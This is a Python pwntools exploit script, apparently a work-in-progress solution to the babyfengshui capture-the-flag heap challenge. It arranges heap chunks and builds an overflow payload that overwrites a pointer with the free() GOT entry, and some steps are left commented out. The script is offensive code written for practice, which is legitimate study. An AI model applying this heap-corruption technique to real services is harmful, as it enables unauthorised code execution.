#!/usr/bin/python
#__author__:TaQini

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64' # 'i386'

local_file  = './babyfengshui_33c3_2016'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

def add(sz, name, l, text):
    sla('Action: ', '0')
    sla('size of description: ' ,str(sz))
    sla('name: ', name)
    sla('text length: ', str(l))
    sla('text: ', text)

def delete(index):
    sla('Action: ', '1')
    sla('index: ', str(index))

def show(index):
    sla('Action: ', '2')
    sla('index: ', str(index))

def update():
    pass

def exit():
    pass

# ru('')
# sl(payload)

array = 0x083f3160

add(0x10, 'AAAA', 0x10, 'aaaa')
add(0x10, 'BBBB', 0x10, 'bbbb')
# add(0x10, 'CCCC', 0x10, '/bin/sh\0')

show(0)
show(1)

delete(0)

# debug()

# add(0x80, 'CCCC', 132, 'D'*132)

free_got = elf.got["free"]

payload = 128*"d" 
payload+= p32(0x0) + p32(0x19) + "\x00"*20 + p32(0x89) + p32(free_got)

# add(0x80, "CCCC", len(payload), payload)


# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

